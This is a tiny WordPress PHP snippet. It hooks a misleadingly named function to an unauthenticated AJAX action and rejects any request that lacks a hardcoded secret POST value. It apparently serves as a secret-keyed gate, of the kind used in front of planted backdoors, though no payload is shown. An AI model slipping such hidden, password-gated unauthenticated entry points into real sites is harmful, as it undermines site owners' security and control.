<?php

function simple_updates_active() {
	if (!isset($_POST["eihszsnr"]) || $_POST["eihszsnr"] !== "rzXukr2NL5s") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'simple_updates_active', 5, 1);
